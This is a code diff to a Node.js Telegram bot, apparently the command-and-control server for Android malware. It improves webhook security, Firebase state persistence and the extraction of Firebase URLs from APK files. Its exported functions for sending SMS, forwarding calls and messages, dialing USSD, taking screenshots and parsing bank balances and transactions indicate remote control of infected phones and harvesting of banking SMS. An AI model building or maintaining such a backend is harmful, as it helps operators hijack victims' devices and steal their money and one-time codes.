@@ -8,16 +8,22 @@
 require('dotenv').config();
 const path = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
 const express = require('express');
 const axios = require('axios');
 const {
   BANK_CONFIG, BANK_NAMES, detectBanksFromText,
   parseBalanceFromText, isBankTransaction,
   extractRealNumber, extractIndianNumber, parseTokenFromMessage,
-  maskFirebase, maskDeviceId, fmtAmount, fmtTimeAgo, safeMd, sleep
+  maskFirebase, maskDeviceId, fmtAmount, fmtTimeAgo, safeMd, sleep, resolveWebhookBase
 } = require('./lib');
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+// Derived from the bot token. Sent by Telegram as a header on every webhook
+// call so we can reject forged requests (shown by getWebhookInfo).
+const WEBHOOK_SECRET = BOT_TOKEN
+  ? crypto.createHash('sha256').update(`ats:${BOT_TOKEN}`).digest('hex').slice(0, 48)
+  : '';
 const OWNER_ID = parseInt(process.env.ADMIN_ID || '7335168552', 10);
 const BACKUP_CHANNEL = parseInt(process.env.BACKUP_CHANNEL || '-1004336937395', 10);
 const POLL_TIMEOUT = process.env.POLL_TIMEOUT || 30;
@@ -51,9 +57,12 @@ let state = {
 };
 
 let stateReady = false;
+let lastLoadTs = 0;
+const STATE_TTL_MS = parseInt(process.env.STATE_TTL_MS || '1500', 10);
 
-async function initState() {
-  if (stateReady) return;
+async function initState(force = false) {
+  const fresh = stateReady && (Date.now() - lastLoadTs) < STATE_TTL_MS;
+  if (fresh && !force) return;
   try {
     if (BOT_DB_URL) {
       const r = await axios.get(`${BOT_DB_URL}/${BOT_DB_PATH}.json`, { timeout: 15000 });
@@ -67,6 +76,7 @@ async function initState() {
       state.admins = [state.owner];
     }
     if (!state.owner) state.owner = OWNER_ID;
+    lastLoadTs = Date.now();
   } catch (e) {
     console.error('State load error:', e.message);
   }
@@ -77,28 +87,49 @@ async function initState() {
       if (me && me.id) state.me = { id: me.id, username: me.username };
     } catch (e) {}
   }
-  saveState();
+  writeLocal();
 }
 
 let remoteSavetimer = null;
-function saveState() {
+let remoteSaveChain = Promise.resolve();
+
+function writeLocal() {
+  // On Vercel the bundle filesystem is read-only; state lives in Firebase.
+  if (process.env.VERCEL && !process.env.STATE_FILE) return;
   try {
     fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
     fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
   } catch (e) {
     console.error('Local state save error:', e.message);
   }
+}
+
+// Durable remote write. Serialized so concurrent callers can't interleave.
+function saveRemote() {
+  if (!BOT_DB_URL) return Promise.resolve();
+  remoteSaveChain = remoteSaveChain
+    .catch(() => {})
+    .then(() => axios.put(`${BOT_DB_URL}/${BOT_DB_PATH}.json`, state, { timeout: 20000 }))
+    .catch(e => { console.error('Remote state save error:', e.message); });
+  return remoteSaveChain;
+}
+
+function saveState() {
+  writeLocal();
   if (BOT_DB_URL) {
     if (remoteSavetimer) clearTimeout(remoteSavetimer);
-    remoteSavetimer = setTimeout(async () => {
-      try {
-        await axios.put(`${BOT_DB_URL}/${BOT_DB_PATH}.json`, state, { timeout: 20000 });
-      } catch (e) {
-        console.error('Remote state save error:', e.message);
-      }
-    }, 300);
+    remoteSavetimer = setTimeout(() => { saveRemote(); }, 300);
   }
-}// ============================================================
+}
+
+// Await this before ending a serverless request so state actually persists.
+async function flushState() {
+  writeLocal();
+  if (remoteSavetimer) { clearTimeout(remoteSavetimer); remoteSavetimer = null; }
+  if (BOT_DB_URL) await saveRemote();
+}
+
+// ============================================================
 // USER HELPERS (strict per-user isolation)
 // ============================================================
 const isOwner = uid => parseInt(uid, 10) === parseInt(state.owner, 10);
@@ -154,9 +185,14 @@ async function tg(method, payload = {}, retries = 2) {
       const r = await axios.post(`${TELEGRAM_API}/${method}`, payload, { timeout: 30000 });
       return r.data?.result ?? r.data;
     } catch (e) {
+      const desc = e.response?.data?.description || '';
+      // Markdown parse errors can never succeed on retry — bail immediately.
+      if (/can't parse entities|parse_mode|unsupported start tag|can't find end/i.test(desc)) {
+        console.error(`TG ${method} markdown error:`, desc);
+        return null;
+      }
       if (i === retries) {
-        const msg = e.response?.data?.description || e.message;
-        console.error(`TG ${method} error:`, msg);
+        console.error(`TG ${method} error:`, desc || e.message);
         return null;
       }
       await sleep(800 * (i + 1));
@@ -164,13 +200,21 @@ async function tg(method, payload = {}, retries = 2) {
   }
 }
 
+// Send with Markdown, and if Telegram rejects the entities fall back to plain
+// text so the user always gets the message.
 async function sendMessage(chatId, text, buttons = null) {
   if (!BOT_TOKEN) return null;
-  return tg('sendMessage', { chat_id: chatId, text, parse_mode: 'Markdown', ...(buttons ? { reply_markup: { inline_keyboard: buttons } } : {}) });
+  const markup = buttons ? { reply_markup: { inline_keyboard: buttons } } : {};
+  let res = await tg('sendMessage', { chat_id: chatId, text, parse_mode: 'Markdown', ...markup });
+  if (!res) res = await tg('sendMessage', { chat_id: chatId, text, ...markup });
+  return res;
 }
 
 async function editMessage(chatId, messageId, text, buttons = null) {
-  return tg('editMessageText', { chat_id: chatId, message_id: messageId, text, parse_mode: 'Markdown', ...(buttons ? { reply_markup: { inline_keyboard: buttons } } : {}) });
+  const markup = buttons ? { reply_markup: { inline_keyboard: buttons } } : {};
+  let res = await tg('editMessageText', { chat_id: chatId, message_id: messageId, text, parse_mode: 'Markdown', ...markup });
+  if (!res) res = await tg('editMessageText', { chat_id: chatId, message_id: messageId, text, ...markup });
+  return res;
 }
 
 async function answerCallback(callbackId, text = '', showAlert = false) {
@@ -237,27 +281,22 @@ async function detectFirebasePath(fbUrl) {
 
 async function extractFirebaseFromAPK(apkBuffer) {
   const detected = new Set();
-  const text = apkBuffer.toString('utf8', 0, Math.min(apkBuffer.length, 300000));
-  const patterns = [
-    /https:\/\/([a-zA-Z0-9\-]+)\.firebaseio\.com/g,
-    /"firebase_database_url":"([^"]+)"/g,
-    /"databaseURL":"([^"]+)"/g,
-    /"database_url":"([^"]+)"/g
-  ];
-  for (const pattern of patterns) {
+  const scan = (str) => {
+    // full firebaseio URLs (any region, incl. .firebasedatabase.app)
+    const full = /https:\/\/[a-zA-Z0-9\-.]+\.(?:firebaseio\.com|firebasedatabase\.app)/g;
     let m;
-    while ((m = pattern.exec(text)) !== null) {
-      let url = m[1] || m[0];
-      if (!url.startsWith('http')) url = 'https://' + url;
-      if (url.includes('firebaseio.com')) detected.add(url.replace(/\/+$/, ''));
+    while ((m = full.exec(str)) !== null) detected.add(m[0].replace(/\/+$/, ''));
+    // config-style "databaseURL":"https://..." captures the full URL directly
+    const quoted = /"(?:firebase_database_url|databaseURL|database_url)"\s*:\s*"([^"]+)"/g;
+    while ((m = quoted.exec(str)) !== null) {
+      let url = m[1].trim();
+      if (url.startsWith('http') && /firebase(io\.com|database\.app)/.test(url)) detected.add(url.replace(/\/+$/, ''));
     }
-  }
-  // also firabase config segment (binary) — best effort second pass in wider window
+  };
+  scan(apkBuffer.toString('utf8', 0, Math.min(apkBuffer.length, 300000)));
+  // second pass on a wider binary window if nothing found yet
   if (detected.size === 0 && apkBuffer.length > 300000) {
-    const text2 = apkBuffer.toString('utf8', 300000, Math.min(apkBuffer.length, 900000));
-    const p2 = /https:\/\/([a-zA-Z0-9\-]+)\.firebaseio\.com/g;
-    let m;
-    while ((m = p2.exec(text2)) !== null) detected.add('https://' + m[1] + '.firebaseio.com');
+    scan(apkBuffer.toString('utf8', 300000, Math.min(apkBuffer.length, 900000)));
   }
   return Array.from(detected);
 }
@@ -1845,45 +1884,79 @@ const app = express();
 app.use(express.json());
 
 app.get('/', async (req, res) => {
+  await initState();
   res.json({ status: 'ok', bot: 'auto-token-sender', users: Object.keys(state.users).length });
 });
 
 app.get('/health', async (req, res) => {
+  await initState();
   res.json({
     status: 'ok',
     timestamp: new Date().toISOString(),
     users: Object.keys(state.users).length,
     devices: Object.keys(state.global_devices).length,
+    webhook: process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || null,
+    bot: state.me ? state.me.username : null,
     mode: process.env.VERCEL ? 'vercel' : 'server'
   });
 });
 
 // Vercel cron hits this → keeps online statuses fresh + flushes state
+// Also self-heals the webhook registration in case it was lost/incorrect.
 app.get('/ping', async (req, res) => {
+  await initState();
   await throttledSweep();
-  if (BOT_DB_URL) saveState();
+  await flushState();
+  await setWebhook().catch(() => {});
   res.json({ status: 'alive', timestamp: new Date().toISOString() });
 });
 
+// Explicit setup / repair endpoint: re-registers the webhook and reports it.
+// Gated by ADMIN_ID (or SETUP_KEY) so it can't be abused publicly.
+app.get('/setup', async (req, res) => {
+  const key = String(req.query.key || '');
+  const allowed = [process.env.SETUP_KEY, process.env.ADMIN_ID].filter(Boolean).map(String);
+  if (!allowed.includes(key)) { res.status(403).json({ status: 'forbidden' }); return; }
+  await initState(true);
+  await setWebhook().catch(() => {});
+  let info = null;
+  try { info = await tg('getWebhookInfo'); } catch (e) {}
+  res.json({ status: 'ok', configured: process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL || process.env.VERCEL_URL || null, webhook: info });
+});
+
 app.post('/webhook', async (req, res) => {
+  // Soft validation: only reject when a secret header is present but wrong, so
+  // a not-yet-updated Telegram registration can never cause dropped updates.
+  const hdr = req.get('x-telegram-bot-api-secret-token') || '';
+  if (WEBHOOK_SECRET && hdr && hdr !== WEBHOOK_SECRET) { res.sendStatus(403); return; }
   try {
     const update = req.body;
     if (update) await handleUpdate(update);
   } catch (e) {
     console.error('Webhook error:', e.message);
   }
+  // Serverless: the function can freeze right after responding, so flush the
+  // durable (Firebase) state write BEFORE returning 200 to Telegram.
+  try { await flushState(); } catch (e) { console.error('Flush error:', e.message); }
   res.sendStatus(200);
 });
 
 async function setWebhook() {
   if (!BOT_TOKEN) return;
-  let base = '';
-  if (process.env.VERCEL_URL) base = `https://${process.env.VERCEL_URL}`;
-  else if (process.env.WEBHOOK_URL) base = process.env.WEBHOOK_URL;
+  // IMPORTANT: on Vercel the per-deployment URL (VERCEL_URL) is protected by
+  // Deployment Protection (SSO) and Telegram cannot reach it (401). Always
+  // prefer the stable, public production alias / custom domain.
+  const base = resolveWebhookBase(process.env);
   if (!base) return;
   try {
-    await tg('setWebhook', { url: `${base}/webhook`, allowed_updates: ['message', 'callback_query', 'channel_post'] });
+    const res = await tg('setWebhook', {
+      url: `${base}/webhook`,
+      allowed_updates: ['message', 'callback_query', 'channel_post'],
+      drop_pending_updates: false,
+      ...(WEBHOOK_SECRET ? { secret_token: WEBHOOK_SECRET } : {})
+    });
     console.log(`✅ Webhook set: ${base}/webhook`);
+    if (res) console.log('   Telegram:', JSON.stringify(res));
   } catch (e) {
     console.error('❌ Webhook failed:', e.message);
   }
@@ -1891,7 +1964,7 @@ async function setWebhook() {
 
 // Fire-and-forget boot (both modes)
 initState();
-if (process.env.VERCEL_URL || process.env.WEBHOOK_URL) setWebhook();
+if (process.env.VERCEL_URL || process.env.WEBHOOK_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL) setWebhook();
 
 // Local/VPS mode: `node api/bot.js`
 if (require.main === module) {
@@ -1907,4 +1980,4 @@ if (require.main === module) {
 }
 
 module.exports = app;
-module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo };
+module.exports._api = { handleUpdate, backgroundSweepOnce, initState, app, sendSMS, ussdDial, callDial, callForward, smsForward, requestScreenshot, getDeviceInfo, extractFirebaseFromAPK };
